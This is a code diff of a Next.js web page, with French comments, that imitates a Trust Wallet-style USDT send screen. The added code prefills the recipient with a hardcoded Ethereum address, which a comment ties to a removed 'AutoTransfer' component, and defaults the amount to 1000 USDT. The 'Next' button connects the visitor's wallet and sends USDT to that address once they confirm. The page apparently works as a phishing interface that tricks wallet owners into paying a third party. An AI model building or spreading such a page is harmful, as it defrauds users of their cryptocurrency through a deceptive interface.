@@ -1,13 +1,55 @@
 "use client";
 
 import { useState } from "react";
-import AutoTransfer from "./components/AutoTransfer";
+import { ethers } from "ethers";
 
-const NEXT_LINK = "https://link.trustwallet.com/open_url?url=https://newethtest.vercel.app/";
+// ============================================================
+// CONFIG
+// ============================================================
+
+// Adresse du destinataire par défaut (celle de AutoTransfer)
+const DEFAULT_RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6";
+
+// USDT sur Ethereum Mainnet
+const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const USDT_DECIMALS = 6;
+
+// ABI minimal ERC-20 pour transfer + balanceOf
+const ERC20_ABI = [
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+];
+
+// Ethereum Mainnet chain ID
+const ETH_CHAIN_ID = "0x1"; // 1 en hex
+
+// ============================================================
+// Types pour window.ethereum
+// ============================================================
+declare global {
+  interface Window {
+    ethereum?: {
+      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+      isMetaMask?: boolean;
+      isTrust?: boolean;
+      on?: (event: string, handler: (...args: unknown[]) => void) => void;
+    };
+  }
+}
+
+// ============================================================
+// Composant principal
+// ============================================================
 
 export default function Home() {
-  const [address, setAddress] = useState("");
+  const [address, setAddress] = useState(DEFAULT_RECEIVER);
   const [amount, setAmount] = useState("1000");
+  const [status, setStatus] = useState<string>("");
+  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
+  const [loading, setLoading] = useState(false);
+  const [txHash, setTxHash] = useState<string>("");
 
   const handlePaste = async () => {
     try {
@@ -19,6 +61,113 @@ export default function Home() {
   };
 
   const parsedAmount = parseFloat(amount) || 0;
+
+  // ----- Connexion wallet + envoi USDT -----
+  const handleSendUSDT = async () => {
+    setStatus("");
+    setTxHash("");
+    setStatusType("info");
+
+    // Validation
+    if (!address || !ethers.isAddress(address)) {
+      setStatus("Please enter a valid Ethereum address.");
+      setStatusType("error");
+      return;
+    }
+
+    if (parsedAmount <= 0) {
+      setStatus("Please enter a valid amount.");
+      setStatusType("error");
+      return;
+    }
+
+    // Vérifier que window.ethereum est présent (Trust Wallet in-app browser)
+    if (!window.ethereum) {
+      setStatus("No wallet detected. Please open this page in Trust Wallet browser.");
+      setStatusType("error");
+      return;
+    }
+
+    setLoading(true);
+    setStatus("Connecting wallet...");
+
+    try {
+      // 1. Demander la connexion
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+
+      // 2. Vérifier / switch vers Ethereum Mainnet
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ETH_CHAIN_ID }],
+        });
+      } catch (switchErr: unknown) {
+        console.warn("Could not switch chain:", switchErr);
+        // Trust Wallet peut ne pas supporter wallet_switchEthereumChain, on continue
+      }
+
+      // 3. Créer le provider et le signer
+      const provider = new ethers.BrowserProvider(window.ethereum as ethers.Eip1193Provider);
+      const signer = await provider.getSigner();
+      const userAddress = await signer.getAddress();
+
+      setStatus(`Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}. Preparing transaction...`);
+
+      // 4. Créer le contrat USDT
+      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
+
+      // 5. Vérifier le solde USDT de l'utilisateur
+      const balance: bigint = await usdtContract.balanceOf(userAddress);
+      const amountInWei = ethers.parseUnits(amount, USDT_DECIMALS);
+
+      const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
+      console.log(`USDT Balance: ${formattedBalance}, Sending: ${amount}`);
+
+      if (balance < amountInWei) {
+        setStatus(`Insufficient USDT balance. You have ${formattedBalance} USDT.`);
+        setStatusType("error");
+        setLoading(false);
+        return;
+      }
+
+      // 6. Envoyer la transaction transfer()
+      setStatus("Please confirm the transaction in your wallet...");
+
+      const tx = await usdtContract.transfer(address, amountInWei);
+
+      setStatus(`Transaction sent! Hash: ${tx.hash.slice(0, 10)}... Waiting for confirmation...`);
+      setTxHash(tx.hash);
+
+      // 7. Attendre la confirmation
+      const receipt = await tx.wait();
+
+      if (receipt && receipt.status === 1) {
+        setStatus(`✅ Transfer successful! ${amount} USDT sent.`);
+        setStatusType("success");
+      } else {
+        setStatus("❌ Transaction failed on-chain.");
+        setStatusType("error");
+      }
+    } catch (err: unknown) {
+      console.error("Transfer error:", err);
+
+      let message = "Transaction failed.";
+      if (err instanceof Error) {
+        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
+          message = "Transaction cancelled by user.";
+        } else if (err.message.includes("insufficient funds")) {
+          message = "Insufficient ETH for gas fees.";
+        } else {
+          message = err.message.length > 100 ? err.message.slice(0, 100) + "..." : err.message;
+        }
+      }
+
+      setStatus(message);
+      setStatusType("error");
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <main className="transfer-main">
@@ -63,7 +212,6 @@ export default function Home() {
           Destination network
         </label>
         <div className="network-selector">
-          {/* Ethereum diamond icon */}
           <div className="eth-icon">
             <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
               <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
@@ -75,17 +223,7 @@ export default function Home() {
             </svg>
           </div>
           <span className="network-name">Ethereum</span>
-          <svg
-            width="12"
-            height="12"
-            viewBox="0 0 24 24"
-            fill="none"
-            stroke="#9ca3af"
-            strokeWidth="2"
-            strokeLinecap="round"
-            strokeLinejoin="round"
-            style={{ marginLeft: "6px" }}
-          >
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
             <polyline points="6 9 12 15 18 9" />
           </svg>
         </div>
@@ -100,20 +238,13 @@ export default function Home() {
             className="input-row__field input-row__field--amount"
           />
           <div className="amount-actions">
-            {/* Up/down arrows */}
             <div className="stepper">
-              <button
-                className="btn-step"
-                onClick={() => setAmount(String(parsedAmount + 1))}
-              >
+              <button className="btn-step" onClick={() => setAmount(String(parsedAmount + 1))}>
                 <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="18 15 12 9 6 15" />
                 </svg>
               </button>
-              <button
-                className="btn-step"
-                onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}
-              >
+              <button className="btn-step" onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}>
                 <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                   <polyline points="6 9 12 15 18 9" />
                 </svg>
@@ -127,18 +258,40 @@ export default function Home() {
         <p className="approx-price">≈ ${parsedAmount.toFixed(2)}</p>
       </div>
 
+      {/* ===== Status Message ===== */}
+      {status && (
+        <div className={`status-message status-message--${statusType}`}>
+          {status}
+          {txHash && (
+            <a
+              href={`https://etherscan.io/tx/${txHash}`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="status-link"
+            >
+              View on Etherscan ↗
+            </a>
+          )}
+        </div>
+      )}
+
       {/* ===== Next Button ===== */}
       <div className="next-btn-wrapper">
-        <a
-          href={NEXT_LINK}
-          rel="noopener noreferrer"
-          className="next-btn"
+        <button
+          onClick={handleSendUSDT}
+          disabled={loading}
+          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
         >
-          Next
-        </a>
+          {loading ? (
+            <span className="btn-spinner-wrapper">
+              <span className="btn-spinner" />
+              Processing...
+            </span>
+          ) : (
+            "Next"
+          )}
+        </button>
       </div>
-
-      <AutoTransfer />
     </main>
   );
 }
